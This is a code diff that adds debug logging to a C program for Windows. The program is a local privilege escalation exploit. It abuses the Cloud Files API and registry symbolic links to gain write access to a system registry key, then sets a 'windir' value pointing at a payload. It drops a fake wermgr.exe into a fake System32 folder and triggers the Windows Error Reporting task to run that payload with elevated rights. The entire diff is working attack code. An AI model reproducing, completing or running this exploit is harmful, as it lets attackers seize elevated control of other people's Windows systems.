@@ -44,6 +44,8 @@ typedef LONG NTSTATUS;
       goto cleanup;                                                            \
   } while (0)
 
+#define DBG(fmt, ...) wprintf(L"[DEBUG] " fmt L"\n", ##__VA_ARGS__)
+
 typedef HANDLE NtKey;
 typedef ULONG SecurityInformation;
 
@@ -459,12 +461,15 @@ DWORD WINAPI CheckKeyThread(LPVOID lpParameter) {
 }
 
 void Stage1(BOOL root_key) {
+  DBG(L"Stage1 enter, root_key=%d", root_key);
   g_done = FALSE;
 
   HANDLE hThreadCheckKey =
       CreateThread(NULL, 0, CheckKeyThread, (LPVOID)(SIZE_T)root_key, 0, NULL);
-  if (hThreadCheckKey == NULL)
+  if (hThreadCheckKey == NULL) {
+    DBG(L"Stage1: CheckKeyThread FAILED");
     return;
+  }
 
   SetThreadPriority(hThreadCheckKey, THREAD_PRIORITY_BELOW_NORMAL);
 
@@ -473,6 +478,7 @@ void Stage1(BOOL root_key) {
                                      GetCurrentProcess(), &hRealCurrentThread,
                                      0, FALSE, DUPLICATE_SAME_ACCESS);
   if (!bDupSuccess) {
+    DBG(L"Stage1: DuplicateHandle FAILED gle=%lu", GetLastError());
     CloseHandle(hThreadCheckKey);
     return;
   }
@@ -482,6 +488,7 @@ void Stage1(BOOL root_key) {
   HANDLE hThreadForceToken = CreateThread(NULL, 0, ForceTokenThread,
                                           (LPVOID)hRealCurrentThread, 0, NULL);
   if (hThreadForceToken == NULL) {
+    DBG(L"Stage1: ForceTokenThread FAILED gle=%lu", GetLastError());
     CloseHandle(hRealCurrentThread);
     CloseHandle(hThreadCheckKey);
     return;
@@ -491,17 +498,23 @@ void Stage1(BOOL root_key) {
   CloseHandle(hThreadCheckKey);
   CloseHandle(hThreadForceToken);
 
-  HMODULE hCfApi = GetModuleHandleW(L"cfapi.dll");
-  if (hCfApi == NULL)
+  HMODULE hCfApi = LoadLibraryW(L"cldapi.dll");
+  if (hCfApi == NULL) {
+    DBG(L"Stage1: LoadLibraryW(cldapi.dll) FAILED");
     return;
+  }
 
   PCfAbortOperation CfAbortOperation =
       (PCfAbortOperation)GetProcAddress(hCfApi, "CfAbortOperation");
-  if (CfAbortOperation == NULL)
+  if (CfAbortOperation == NULL) {
+    DBG(L"Stage1: CfAbortOperation not found");
     return;
+  }
 
+  DBG(L"Stage1: entering CfAbortOperation loop");
   while (!g_done)
     CfAbortOperation(GetCurrentProcessId(), NULL, AbortHydrationFlagsBlock);
+  DBG(L"Stage1: loop exited");
 }
 
 DWORD WINAPI Stage1Thread(LPVOID lpParameter) {
@@ -510,17 +523,24 @@ DWORD WINAPI Stage1Thread(LPVOID lpParameter) {
 }
 
 void Stage2() {
+  DBG(L"Stage2 enter");
   HANDLE hCloudFilesKey = OpenKey(
       NULL, CLOUD_FILES, WRITE_DAC | WRITE_OWNER | KEY_ENUMERATE_SUB_KEYS);
-  if (hCloudFilesKey == NULL)
+  if (hCloudFilesKey == NULL) {
+    DBG(L"Stage2: OpenKey(CloudFiles) FAILED, will retry with Stage1 first");
     return;
+  }
+  DBG(L"Stage2: CloudFiles key opened");
 
   SetSecurityDescriptor(hCloudFilesKey,
                         DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION);
   DeleteRegistryTree(hCloudFilesKey);
   CloseHandle(hCloudFilesKey);
+  DBG(L"Stage2: creating registry symlink");
   CreateRegistrySymbolicLink(BLOCKED_APPS, TARGET_KEY);
+  DBG(L"Stage2: calling Stage1(FALSE)");
   Stage1(FALSE);
+  DBG(L"Stage2 done");
 }
 
 DWORD WINAPI Stage2Thread(LPVOID lpParameter) {
@@ -530,30 +550,41 @@ DWORD WINAPI Stage2Thread(LPVOID lpParameter) {
 }
 
 void Stage3() {
+  DBG(L"Stage3 enter");
+
   HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
-  if (!hNtDll)
+  if (!hNtDll) {
+    DBG(L"Stage3: ntdll not loaded");
     return;
+  }
 
   PNtDeleteKey NtDeleteKey =
       (PNtDeleteKey)GetProcAddress(hNtDll, "NtDeleteKey");
-  if (!NtDeleteKey)
+  if (!NtDeleteKey) {
+    DBG(L"Stage3: NtDeleteKey not found");
     return;
+  }
 
   HANDLE hBlockedKey = OpenKey(NULL, BLOCKED_APPS, DELETE);
   if (hBlockedKey != NULL) {
+    DBG(L"Stage3: deleting blocked apps key");
     NtDeleteKey(hBlockedKey);
     CloseHandle(hBlockedKey);
-  }
+  } else
+    DBG(L"Stage3: OpenKey(BLOCKED_APPS, DELETE) returned NULL");
 
   HANDLE hTargetKey = OpenKey(NULL, TARGET_KEY, WRITE_DAC | WRITE_OWNER);
   if (hTargetKey != NULL) {
+    DBG(L"Stage3: setting security on target key");
     SetSecurityDescriptor(hTargetKey, DACL_SECURITY_INFORMATION);
     CloseHandle(hTargetKey);
-  }
+  } else
+    DBG(L"Stage3: OpenKey(TARGET_KEY, WRITE) returned NULL");
 
   HKEY hKey2 = NULL;
   LPCWSTR volatileEnvPath = L".DEFAULT\\Volatile Environment";
 
+  DBG(L"Stage3: enumerating Volatile Environment subkeys");
   if (RegOpenKeyExW(HKEY_USERS, volatileEnvPath, 0,
                     KEY_READ | KEY_ENUMERATE_SUB_KEYS,
                     &hKey2) == ERROR_SUCCESS) {
@@ -563,6 +594,7 @@ void Stage3() {
 
     while (RegEnumKeyExW(hKey2, index, subKeyName, &nameSize, NULL, NULL, NULL,
                          NULL) == ERROR_SUCCESS) {
+      DBG(L"Stage3: cleaning subkey %s", subKeyName);
 
       WCHAR fullSubKeyPath[MAX_PATH * 2];
       swprintf_s(fullSubKeyPath, MAX_PATH * 2, L"%s\\%s", TARGET_KEY,
@@ -587,11 +619,14 @@ void Stage3() {
 
   PNtSetValueKey NtSetValueKey =
       (PNtSetValueKey)GetProcAddress(hNtDll, "NtSetValueKey");
-  if (NtSetValueKey == NULL)
+  if (NtSetValueKey == NULL) {
+    DBG(L"Stage3: NtSetValueKey not found");
     return;
+  }
 
   HANDLE hTarget = OpenKey(NULL, TARGET_KEY, KEY_SET_VALUE);
   if (hTarget != NULL) {
+    DBG(L"Stage3: writing registry values");
     UNICODE_STRING usValueName;
     usValueName.Buffer = L"windir";
     usValueName.Length = (USHORT)(wcslen(L"windir") * sizeof(WCHAR));
@@ -613,7 +648,8 @@ void Stage3() {
                   (ULONG)((wcslen(g_payloadPath) + 1) * sizeof(WCHAR)));
 
     CloseHandle(hTarget);
-  }
+  } else
+    DBG(L"Stage3: OpenKey(TARGET_KEY, SET_VALUE) returned NULL");
 
   WCHAR fakeSys32Path[MAX_PATH];
   wcscpy(fakeSys32Path, g_configDir);
@@ -624,6 +660,7 @@ void Stage3() {
   wcscpy(fakeWerPath, fakeSys32Path);
   wcscat(fakeWerPath, L"\\wermgr.exe");
 
+  DBG(L"Stage3: writing fake wermgr.exe to %s", fakeWerPath);
   HANDLE hWerFile =
       CreateFileW(fakeWerPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                   FILE_ATTRIBUTE_NORMAL, NULL);
@@ -632,27 +669,40 @@ void Stage3() {
     WriteFile(hWerFile, build_mini_runner_exe, build_mini_runner_exe_len, &written,
               NULL);
     CloseHandle(hWerFile);
-  }
+    DBG(L"Stage3: wrote %lu bytes", written);
+  } else
+    DBG(L"Stage3: CreateFileW(wermgr.exe) FAILED gle=%lu", GetLastError());
 
+  DBG(L"Stage3: creating pipe %s", g_pipeName);
   HANDLE hPipe = CreateNamedPipeW(g_pipeName, PIPE_ACCESS_DUPLEX,
                                    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE |
                                        PIPE_WAIT,
                                    1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
-  if (hPipe == INVALID_HANDLE_VALUE)
-    return;
-
-  BOOL bConnected = ConnectNamedPipe(hPipe, NULL);
-  if (!bConnected && GetLastError() != ERROR_PIPE_CONNECTED) {
-    CloseHandle(hPipe);
+  if (hPipe == INVALID_HANDLE_VALUE) {
+    DBG(L"Stage3: CreateNamedPipeW FAILED gle=%lu", GetLastError());
     return;
   }
 
+  DBG(L"Stage3: triggering WER task");
   ExecuteTask();
 
+  DBG(L"Stage3: waiting for pipe connection");
+  BOOL bConnected = ConnectNamedPipe(hPipe, NULL);
+  if (!bConnected && GetLastError() != ERROR_PIPE_CONNECTED) {
+    DBG(L"Stage3: ConnectNamedPipe FAILED gle=%lu", GetLastError());
+    CloseHandle(hPipe);
+    return;
+  }
+  DBG(L"Stage3: pipe connected");
+
+  DBG(L"Stage3: waiting for runner to connect...");
   BYTE inBuffer[1];
   DWORD bytesRead = 0;
   BOOL bReadSuccess =
       ReadFile(hPipe, inBuffer, sizeof(inBuffer), &bytesRead, NULL);
+
+  DBG(L"Stage3: ReadFile returned %d, gle=%lu, bytes=%lu",
+      bReadSuccess, GetLastError(), bytesRead);
 
   if (bReadSuccess && bytesRead > 0)
     wprintf(L":)\n");
@@ -668,11 +718,14 @@ void Stage3() {
   RemoveDirectoryW(g_configDir);
 
   HANDLE hTargetKeyDelete = OpenKey(NULL, TARGET_KEY, DELETE);
-  if (hTargetKeyDelete == NULL)
+  if (hTargetKeyDelete == NULL) {
+    DBG(L"Stage3: OpenKey(TARGET_KEY, DELETE) returned NULL for cleanup");
     return;
+  }
 
   DeleteRegistryTree(hTargetKeyDelete);
   CloseHandle(hTargetKeyDelete);
+  DBG(L"Stage3 done");
 }
 
 static void GenerateRid() {
@@ -693,44 +746,64 @@ static void BuildPaths() {
 }
 
 int main(int argc, char *argv[]) {
+  DBG(L"main started, argc=%d", argc);
   if (argc >= 2)
     mbstowcs(g_payloadPath, argv[1], MAX_PATH);
   else
     wcscpy(g_payloadPath, L"C:\\Windows\\System32\\conhost.exe");
 
-  HMODULE hCfApi = GetModuleHandleW(L"cfapi.dll");
-  if (hCfApi == NULL)
+  DBG(L"loading cldapi.dll");
+  HMODULE hCfApi = LoadLibraryW(L"cldapi.dll");
+  if (hCfApi == NULL) {
+    DBG(L"LoadLibraryW(cldapi.dll) FAILED, GLE=%lu", GetLastError());
     return 1;
+  }
+  DBG(L"cldapi.dll loaded at %p", hCfApi);
 
   PCfGetPlatformInfo CfGetPlatformInfo =
       (PCfGetPlatformInfo)GetProcAddress(hCfApi, "CfGetPlatformInfo");
-  if (CfGetPlatformInfo == NULL)
+  if (CfGetPlatformInfo == NULL) {
+    DBG(L"CfGetPlatformInfo not found");
     return 1;
+  }
 
   CF_PLATFORM_INFO cfInfo;
   HRESULT hr = CfGetPlatformInfo(&cfInfo);
+  DBG(L"CfGetPlatformInfo returned hr=0x%08lX (build=%lu rev=%lu)",
+      hr, cfInfo.BuildNumber, cfInfo.RevisionNumber);
   CHECK_HR(hr);
 
   GenerateRid();
   BuildPaths();
+  DBG(L"rid=%s configDir=%s pipeName=%s payload=%s",
+      g_rid, g_configDir, g_pipeName, g_payloadPath);
 
+  DBG(L"=== Stage1 ===");
   {
     HANDLE hThread =
         CreateThread(NULL, 0, Stage1Thread, (LPVOID)(SIZE_T)TRUE, 0, NULL);
+    if (hThread == NULL) DBG(L"Stage1Thread CreateThread FAILED");
     WaitForSingleObject(hThread, 15000);
     CloseHandle(hThread);
   }
 
+  DBG(L"=== Stage2 ===");
   {
     HANDLE hThread = CreateThread(NULL, 0, Stage2Thread, NULL, 0, NULL);
+    if (hThread == NULL) DBG(L"Stage2Thread CreateThread FAILED");
     WaitForSingleObject(hThread, 15000);
     CloseHandle(hThread);
   }
 
+  DBG(L"=== Stage3 ===");
   Stage3();
 
+  DBG(L"=== Done ===");
+  wprintf(L"Press Enter to exit...");
+  getchar();
   return 0;
 
 cleanup:
+  DBG(L"cleanup: CfGetPlatformInfo failed");
   return 1;
 }
